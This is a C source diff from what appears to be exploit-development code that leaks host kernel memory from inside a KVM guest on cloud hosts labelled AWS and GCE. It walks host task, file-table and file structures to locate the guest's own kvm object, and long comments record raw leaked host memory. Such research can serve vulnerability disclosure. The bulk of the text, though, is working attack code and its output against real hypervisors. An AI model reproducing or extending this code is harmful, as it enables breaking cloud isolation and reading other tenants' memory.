@@ -793,6 +793,7 @@ void get_feeling_for_kernel_kvm_data_structures(void)
 
 	printf(">>> Traverse parents and children of task_structs:\n");
 
+#if MACHINE == FATHER
 	hva_t swapp = 0xffffffff98e0ff00;
 	get_feeling_dump_task(swapp);
 	hva_t systemd = hc_read_va(swapp+H_TASK_TASKS) - H_TASK_TASKS;
@@ -803,7 +804,7 @@ void get_feeling_for_kernel_kvm_data_structures(void)
 		get_feeling_dump_task(child);
 		entry = hc_read_va(entry);
 	} while (entry != systemd+H_TASK_CHILDREN);
-
+#endif
 }
 
 void reverse_host_kernel_data_structures_aws(void)
@@ -892,9 +893,11 @@ void reverse_around(hpa_t base, hpa_t pa)
 void reverse_after(hpa_t base, hpa_t pa, hva_t hdm, const char *name, int len)
 {
 	for (int off = 0; off < len; off += 8) {
-		// u64 data = leak64(base, pa+off);
-		u64 data = 0;
-		leak(&data, base, pa+off+5, 1); 
+		u64 data = leak64(base, pa+off);
+		// for (int i = 1; i < 8; i++)
+		// 	data = leak64(base, pa+off);
+		// u64 data = 0;
+		// leak(&data, base, pa+off+5, 1); 
 		printf("dm %16lx | pa %12lx | %16s+%4x = %16lx\n", hdm+pa+off, pa+off, name, off, data);
 	}
 }
@@ -1571,7 +1574,6 @@ void reverse_kvm_module(hpa_t base)
 	//   28:                 0   00 00 00 00 00 00 00 00 ........
 }
 
-
 void reverse_aws_task_files_fdt_fd_priv(hpa_t base, hva_t hdm, hpa_t hcr3, hva_t vcpu, hva_t task)
 {
 	printf("\nfind_own_kvm_via_fds(base=%lx, hdm=%lx, vcpu=%lx, task=%lx)\n" HLINE, base, hdm, vcpu, task);
@@ -1697,6 +1699,279 @@ void reverse_aws_task_files_fdt_fd_priv(hpa_t base, hva_t hdm, hpa_t hcr3, hva_t
 	// 	0xffff93e45b190400,
 	// 	0xffff93e45b192b00,
 	// 	0xffff93e45b18b600
+	// };
+
+	// For all candidate private_data offsets (0xc0 and 0xe8 below), try to
+	// find a vmalloc-ed pointer: candidate for our `struct kvm`.
+	// for (int i = 0; i < 0x30; i++) {
+	// 	dump(i);
+	// 	dump(fd_data[i]);
+	// 	reverse_after(base, fd_data[i]-hdm+0xc0, hdm, "fd_data[i]+0xc0", 0x8);
+	// 	reverse_after(base, fd_data[i]-hdm+0xe8, hdm, "fd_data[i]+0xe8", 0x8);
+	// }
+	// FOUND: at fd[9]+0xc0, we see our own kvm pointer.
+
+	hva_t kvm_candidate = 0xffff93e45b1974c0; // at fd[9] + 0xc0
+	dump(leak64(base, kvm_candidate-hdm));
+	dump(OWN_KVM);
+}
+
+void reverse_gce_task_files_fdt_fd_priv(hpa_t base, hva_t hdm, hpa_t hcr3, hva_t vcpu, hva_t task)
+{
+	printf("\nfind_own_kvm_via_fds(base=%lx, hdm=%lx, vcpu=%lx, task=%lx)\n" HLINE, base, hdm, vcpu, task);
+
+	dump(task);
+	dump((u64)H_TASK_COMM);
+	// reverse_after(base, task-hdm+H_TASK_COMM, hdm, "task+COMM", 0x90);
+	//                           task = ffff936fa3088040
+	//                     (u64)0xc38 =              c38
+	// dm ffff936fa3088c78 | pa   2f63088c78 |        task+COMM+   0 = 6f00302d55504356
+	// dm ffff936fa3088c80 | pa   2f63088c80 |        task+COMM+   8 =   656c6c6f72746e
+	// dm ffff936fa3088c88 | pa   2f63088c88 |        task+COMM+  10 =                0
+	// dm ffff936fa3088c90 | pa   2f63088c90 |        task+COMM+  18 = ffff9341801f50e0
+	// dm ffff936fa3088c98 | pa   2f63088c98 |        task+COMM+  20 = ffff936fa3088c98
+	// dm ffff936fa3088ca0 | pa   2f63088ca0 |        task+COMM+  28 = ffff936fa3088c98
+	// dm ffff936fa3088ca8 | pa   2f63088ca8 |        task+COMM+  30 = ffff9341571b7940
+	// dm ffff936fa3088cb0 | pa   2f63088cb0 |        task+COMM+  38 = ffff934154313600
+	// dm ffff936fa3088cb8 | pa   2f63088cb8 |        task+COMM+  40 = ffff93414def56c0
+	// dm ffff936fa3088cc0 | pa   2f63088cc0 |        task+COMM+  48 = ffff93417311bb40
+	// dm ffff936fa3088cc8 | pa   2f63088cc8 |        task+COMM+  50 = ffff93414d72b3c0
+	// dm ffff936fa3088cd0 | pa   2f63088cd0 |        task+COMM+  58 =                0
+	// dm ffff936fa3088cd8 | pa   2f63088cd8 |        task+COMM+  60 =                0
+	// dm ffff936fa3088ce0 | pa   2f63088ce0 |        task+COMM+  68 =                0
+	// dm ffff936fa3088ce8 | pa   2f63088ce8 |        task+COMM+  70 = ffff936fa3088ce8
+	// dm ffff936fa3088cf0 | pa   2f63088cf0 |        task+COMM+  78 = ffff936fa3088ce8
+	// dm ffff936fa3088cf8 | pa   2f63088cf8 |        task+COMM+  80 =                0
+	// dm ffff936fa3088d00 | pa   2f63088d00 |        task+COMM+  88 =     7f389b8d9000
+	// dm ffff936fa3088d08 | pa   2f63088d08 |        task+COMM+  90 =            20000
+	// dm ffff936fa3088d10 | pa   2f63088d10 |        task+COMM+  98 =                0
+	// dm ffff936fa3088d18 | pa   2f63088d18 |        task+COMM+  a0 =                0
+	// dm ffff936fa3088d20 | pa   2f63088d20 |        task+COMM+  a8 =                0
+	// dm ffff936fa3088d28 | pa   2f63088d28 |        task+COMM+  b0 = ffffffffffffffff
+	// dm ffff936fa3088d30 | pa   2f63088d30 |        task+COMM+  b8 =                0
+	// dm ffff936fa3088d38 | pa   2f63088d38 |        task+COMM+  c0 =                0
+	// dm ffff936fa3088d40 | pa   2f63088d40 |        task+COMM+  c8 =                f
+	// dm ffff936fa3088d48 | pa   2f63088d48 |        task+COMM+  d0 =               11
+	// dm ffff936fa3088d50 | pa   2f63088d50 |        task+COMM+  d8 =                0
+
+	// Conclusion: H_TASK_FILES = H_TASK_COMM + 0x48 ??
+
+	// hva_t file_candidates[] = {
+	// 	0xffff9341801f50e0,
+	// 	0xffff9341571b7940,
+	// 	0xffff934154313600,
+	// 	0xffff93414def56c0,
+	// 	0xffff93417311bb40,
+	// 	0xffff93414d72b3c0,
+	// };
+	// for (u64 i = 0; i < sizeof(file_candidates)/sizeof(hva_t); i++) {
+	// 	dump(i);
+	// 	hva_t files = file_candidates[i]; dump(files);
+	// 	reverse_after(base, files-hdm, hdm, "files", 0x80);
+	// }
+	// 	i =                0
+	// 	files = ffff9341801f50e0
+	// dm ffff9341801f50e0 | pa    1401f50e0 |            files+   0 =              1aa
+	// dm ffff9341801f50e8 | pa    1401f50e8 |            files+   8 = ffff9341801f50e8 // empty list
+	// dm ffff9341801f50f0 | pa    1401f50f0 |            files+  10 = ffff9341801f50e8 // empty list
+	// dm ffff9341801f50f8 | pa    1401f50f8 |            files+  18 =                0
+	// dm ffff9341801f5100 | pa    1401f5100 |            files+  20 =                0
+	// dm ffff9341801f5108 | pa    1401f5108 |            files+  28 =                0
+	// dm ffff9341801f5110 | pa    1401f5110 |            files+  30 =                0
+	// dm ffff9341801f5118 | pa    1401f5118 |            files+  38 =                0
+	// dm ffff9341801f5120 | pa    1401f5120 |            files+  40 = 6d2e70756f726763
+	// dm ffff9341801f5128 | pa    1401f5128 |            files+  48 = 68747065642e7861
+	// dm ffff9341801f5130 | pa    1401f5130 |            files+  50 =     6c6f72746e00
+	// dm ffff9341801f5138 | pa    1401f5138 |            files+  58 =                0
+	// dm ffff9341801f5140 | pa    1401f5140 |            files+  60 = 6d2e746573757063
+	// dm ffff9341801f5148 | pa    1401f5148 |            files+  68 = 72705079706f6d65
+	// dm ffff9341801f5150 | pa    1401f5150 |            files+  70 =     657275737365
+	// dm ffff9341801f5158 | pa    1401f5158 |            files+  78 =                0
+	// 	    i =                1
+	// 	files = ffff9341571b7940
+	// dm ffff9341571b7940 | pa    1171b7940 |            files+   0 =              1a7
+	// dm ffff9341571b7948 | pa    1171b7948 |            files+   8 =        20000107e
+	// dm ffff9341571b7950 | pa    1171b7950 |            files+  10 =                0
+	// dm ffff9341571b7958 | pa    1171b7958 |            files+  18 = ffff93414e3006a0
+	// dm ffff9341571b7960 | pa    1171b7960 |            files+  20 = fff0904233b1dcc0
+	// dm ffff9341571b7968 | pa    1171b7968 |            files+  28 = ffff934150d19ea0
+	// dm ffff9341571b7970 | pa    1171b7970 |            files+  30 = ffff93a14c3f3300
+	// dm ffff9341571b7978 | pa    1171b7978 |            files+  38 =                0
+	// dm ffff9341571b7980 | pa    1171b7980 |            files+  40 =                0
+	// dm ffff9341571b7988 | pa    1171b7988 |            files+  48 =       1200000000
+	// dm ffff9341571b7990 | pa    1171b7990 |            files+  50 =                0
+	// dm ffff9341571b7998 | pa    1171b7998 |            files+  58 = ffff93415419db60
+	// dm ffff9341571b79a0 | pa    1171b79a0 |            files+  60 = ffff93428d2fc6c0
+	// dm ffff9341571b79a8 | pa    1171b79a8 |            files+  68 = ffff93415419db60
+	// dm ffff9341571b79b0 | pa    1171b79b0 |            files+  70 = ffff93428d2fc6c0
+	// dm ffff9341571b79b8 | pa    1171b79b8 |            files+  78 =                0
+	// 	    i =                2
+	// 	files = ffff934154313600
+	// dm ffff934154313600 | pa    114313600 |            files+   0 =    70500000001a6
+	// dm ffff934154313608 | pa    114313608 |            files+   8 =                0
+	// dm ffff934154313610 | pa    114313610 |            files+  10 = ffff934154313610 // empty list
+	// dm ffff934154313618 | pa    114313618 |            files+  18 = ffff934154313610 // empty list
+	// dm ffff934154313620 | pa    114313620 |            files+  20 = f0ff93425e259700  <-- look promising, but nibbles missing...
+	// dm ffff934154313628 | pa    114313628 |            files+  28 =               40
+	// dm ffff934154313630 | pa    114313630 |            files+  30 = ffff9341543136a0
+	// dm ffff934154313638 | pa    114313638 |            files+  38 = ffff934154313688
+	// dm ffff934154313640 | pa    114313640 |            files+  40 = ffff934154313690
+	// dm ffff934154313648 | pa    114313648 |            files+  48 = ffff934154313698
+	// dm ffff934154313650 | pa    114313650 |            files+  50 =                0
+	// dm ffff934154313658 | pa    114313658 |            files+  58 =                0
+	// dm ffff934154313660 | pa    114313660 |            files+  60 =                0
+	// dm ffff934154313668 | pa    114313668 |            files+  68 =                0
+	// dm ffff934154313670 | pa    114313670 |            files+  70 =                0
+	// dm ffff934154313678 | pa    114313678 |            files+  78 =                0
+	// 	    i =                3
+	// 	files = ffff93414def56c0
+	// dm ffff93414def56c0 | pa    10def56c0 |            files+   0 =              1a9
+	// dm ffff93414def56c8 | pa    10def56c8 |            files+   8 = ffff934159c90590
+	// dm ffff93414def56d0 | pa    10def56d0 |            files+  10 = ffff93429704e000
+	// dm ffff93414def56d8 | pa    10def56d8 |            files+  18 = ffff93a08cb19a00
+	// dm ffff93414def56e0 | pa    10def56e0 |            files+  20 = ffffffff85001040
+	// dm ffff93414def56e8 | pa    10def56e8 |            files+  28 = ffffffff867c2040
+	// dm ffff93414def56f0 | pa    10def56f0 |            files+  30 = ffffffff8545b868
+	// dm ffff93414def56f8 | pa    10def56f8 |            files+  38 = ffffffff0545b868
+	// dm ffff93414def5700 | pa    10def5700 |            files+  40 = ffffffff854619f8
+	// dm ffff93414def5708 | pa    10def5708 |            files+  48 =                0
+	// dm ffff93414def5710 | pa    10def5710 |            files+  50 = ffff93a195d306c0
+	// dm ffff93414def5718 | pa    10def5718 |            files+  58 = ffffffff854c2f80
+	// dm ffff93414def5720 | pa    10def5720 |            files+  60 = ffff93a08cb19a00
+	// dm ffff93414def5728 | pa    10def5728 |            files+  68 = ffffffff850b1d40
+	// dm ffff93414def5730 | pa    10def5730 |            files+  70 = ffffffff867c2040
+	// dm ffff93414def5738 | pa    10def5738 |            files+  78 = ffffffff8545b868
+	// 	    i =                4
+	// 	files = ffff93417311bb40
+	// dm ffff93417311bb40 | pa    13311bb40 |            files+   0 =      1a9000001a9
+	// dm ffff93417311bb48 | pa    13311bb48 |            files+   8 =              1aa
+	// dm ffff93417311bb50 | pa    13311bb50 |            files+  10 = ffff934214810c08
+	// dm ffff93417311bb58 | pa    13311bb58 |            files+  18 = ffff93a15a644bc8
+	// dm ffff93417311bb60 | pa    13311bb60 |            files+  20 =                0
+	// dm ffff93417311bb68 | pa    13311bb68 |            files+  28 = ffff93417311bb68 // empty list
+	// dm ffff93417311bb70 | pa    13311bb70 |            files+  30 = ffff93417311bb68 // empty list
+	// dm ffff93417311bb78 | pa    13311bb78 |            files+  38 = ffff934214810140 <-- maybe also promising?
+	// dm ffff93417311bb80 | pa    13311bb80 |            files+  40 = ffff93417311bb80 // empty list
+	// dm ffff93417311bb88 | pa    13311bb88 |            files+  48 = ffff93417311bb80 // empty list
+	// dm ffff93417311bb90 | pa    13311bb90 |            files+  50 =                0
+	// dm ffff93417311bb98 | pa    13311bb98 |            files+  58 =                0
+	// dm ffff93417311bba0 | pa    13311bba0 |            files+  60 =                0
+	// dm ffff93417311bba8 | pa    13311bba8 |            files+  68 =                0
+	// dm ffff93417311bbb0 | pa    13311bbb0 |            files+  70 =                0
+	// dm ffff93417311bbb8 | pa    13311bbb8 |            files+  78 =    f643200000002
+	// 	    i =                5
+	// 	files = ffff93414d72b3c0
+	// dm ffff93414d72b3c0 | pa    10d72b3c0 |            files+   0 =      1a600000001
+	// dm ffff93414d72b3c8 | pa    10d72b3c8 |            files+   8 = 8b48000000000000
+	// dm ffff93414d72b3d0 | pa    10d72b3d0 |            files+  10 = ffff93414d72b3d0 // empty list
+	// dm ffff93414d72b3d8 | pa    10d72b3d8 |            files+  18 = ffff93414d72b3d0 // empty list
+	// dm ffff93414d72b3e0 | pa    10d72b3e0 |            files+  20 =                1
+	// dm ffff93414d72b3e8 | pa    10d72b3e8 |            files+  28 =          4000000
+	// dm ffff93414d72b3f0 | pa    10d72b3f0 |            files+  30 =     7f389e38fe80
+	// dm ffff93414d72b3f8 | pa    10d72b3f8 |            files+  38 =                0
+	// dm ffff93414d72b400 | pa    10d72b400 |            files+  40 =     556b028ed620
+	// dm ffff93414d72b408 | pa    10d72b408 |            files+  48 =          4000004
+	// dm ffff93414d72b410 | pa    10d72b410 |            files+  50 =     7f389e38fe80
+	// dm ffff93414d72b418 | pa    10d72b418 |            files+  58 =                0
+	// dm ffff93414d72b420 | pa    10d72b420 |            files+  60 =                0
+	// dm ffff93414d72b428 | pa    10d72b428 |            files+  68 =                0
+	// dm ffff93414d72b430 | pa    10d72b430 |            files+  70 =                0
+	// dm ffff93414d72b438 | pa    10d72b438 |            files+  78 =                0
+        
+	hva_t promising_file_cand = 0xffff934154313600 + 0x20; dump(promising_file_cand);
+	// for (int i = 0; i < 10; i++)
+	// 	reverse_after(base, promising_file_cand-hdm, hdm, "promising_file_cand", 8);
+	// promising_file_cand = ffff934154313620
+	// dm ffff934154313620 | pa    114313620 | promising_file_cand+   0 = ffff93425e259700
+	// dm ffff934154313620 | pa    114313620 | promising_file_cand+   0 = ffff93425e259700
+	// dm ffff934154313620 | pa    114313620 | promising_file_cand+   0 = ffff93425e259718
+	// dm ffff934154313620 | pa    114313620 | promising_file_cand+   0 = ffff93425e259718
+	// dm ffff934154313620 | pa    114313620 | promising_file_cand+   0 = ffff93425e259718
+	// dm ffff934154313620 | pa    114313620 | promising_file_cand+   0 = ffff93425e259718
+	// dm ffff934154313620 | pa    114313620 | promising_file_cand+   0 = ffff93425e259718
+	// dm ffff934154313620 | pa    114313620 | promising_file_cand+   0 = ffff93425e259718
+	// dm ffff934154313620 | pa    114313620 | promising_file_cand+   0 = ffff93425e259718
+	// dm ffff934154313620 | pa    114313620 | promising_file_cand+   0 = ffff93425e259718
+		
+	hva_t fdt_cand = 0xffff93425e259700; dump(fdt_cand);
+	// reverse_after(base, fdt_cand-hdm, hdm, "fdt_cand", 0x40);
+	// fdt_cand = ffff93425e259700                               
+	// dm ffff93425e259700 | pa    21e259700 |         fdt_cand+   0 =        100000400
+	// dm ffff93425e259708 | pa    21e259708 |         fdt_cand+   8 = ffff93429611c000
+	// dm ffff93425e259710 | pa    21e259710 |         fdt_cand+  10 = ffff9341f2c55280
+	// dm ffff93425e259718 | pa    21e259718 |         fdt_cand+  18 = ffff9341f2c55200
+	// dm ffff93425e259720 | pa    21e259720 |         fdt_cand+  20 = ffff9341f2c55300
+	// dm ffff93425e259728 | pa    21e259728 |         fdt_cand+  28 = ffff93425e259720
+	// dm ffff93425e259730 | pa    21e259730 |         fdt_cand+  30 =  2233c0518093216
+	// dm ffff93425e259738 | pa    21e259738 |         fdt_cand+  38 = 1c2b103804313e08
+	
+	hva_t fd_cand = 0xffff93429611c000; dump(fd_cand);
+	// reverse_after(base, fd_cand-hdm, hdm, "fd_cand", 0x30*8);
+	// dm ffff93429611c000 | pa    25611c000 |          fd_cand+   0 = ffff934215403900
+	// dm ffff93429611c008 | pa    25611c008 |          fd_cand+   8 = ffff930215403f00
+	// dm ffff93429611c010 | pa    25611c010 |          fd_cand+  10 = ffff934210403b00
+	// dm ffff93429611c018 | pa    25611c018 |          fd_cand+  18 = ffff9342bf180600
+	// dm ffff93429611c020 | pa    25611c020 |          fd_cand+  20 = ffff93420f180800
+	// dm ffff93429611c028 | pa    25611c028 |          fd_cand+  28 = ffff9342bf180500
+	// dm ffff93429611c030 | pa    25611c030 |          fd_cand+  30 = ffff934294007000
+	// Conclusion: the (struct file *)-array starts at `fd`
+	
+	
+
+	// hva_t fds[] = {
+	// 	0xffff934215403900,
+	// 	0xffff934215403f00,
+	// 	0xffff934215403b00,
+	// 	0xffff9342bf180600,
+	// 	0xffff9342bf180800,
+	// 	0xffff9342bf180500,
+	// 	0xffff934294007000,
+	// };
+	// for (u64 i = 0; i < sizeof(fds)/sizeof(hva_t); i++) {
+	// 	dump(i); dump(fds[i]);
+	// 	reverse_after(base, fds[i]-hdm, hdm, "struct file", 0x100);
+	// }
+	int cand_priv_offs[] = {0x10, 0x18, 0x20, 0x28, 0x58, 0x60, 0x90, 0xd8, 0xf0, 0xf8};
+
+
+	while (1) {
+		for (int fdi = 0; fdi < 0x30; fdi++) {
+			dump((u64)fdi);
+			int off = fdi * 8;
+			u64 filep = leak64(base, fd_cand-hdm+off);
+			for (int i = 1; i < 8; i++)
+				filep = leak64(base, fd_cand-hdm+off);
+			dump(filep);
+			
+			for (unsigned long j = 0; j < sizeof(cand_priv_offs)/sizeof(int); j++) {
+				dump((u64)cand_priv_offs[j]);
+				uint8_t x;
+				leak(&x, base, filep-hdm+cand_priv_offs[j]+5, 1);
+				dump((u64)x);
+				if (x == 0x95) {
+					u64 priv = leak64(base, filep-hdm+cand_priv_offs[j]);
+					priv = leak64(base, filep-hdm+cand_priv_offs[j]);
+					priv = leak64(base, filep-hdm+cand_priv_offs[j]);
+					priv = leak64(base, filep-hdm+cand_priv_offs[j]);
+					priv = leak64(base, filep-hdm+cand_priv_offs[j]);
+					priv = leak64(base, filep-hdm+cand_priv_offs[j]);
+					priv = leak64(base, filep-hdm+cand_priv_offs[j]);
+					dump(priv);
+				}
+			}
+		}
+	}
+
+	exit(0);
+
+
+	// hva_t fd_data[0x30];
+	// leak(fd_data, base, fd-hdm, sizeof(fd_data));
+	// display(fd_data, sizeof(fd_data));
+	// hva_t fd_data[0x30] = {
+	// 	0xffff93e3c6600800,
+	// 	0xffff93e3c6600800,
+	//	...
 	// };
 
 	// For all candidate private_data offsets (0xc0 and 0xe8 below), try to
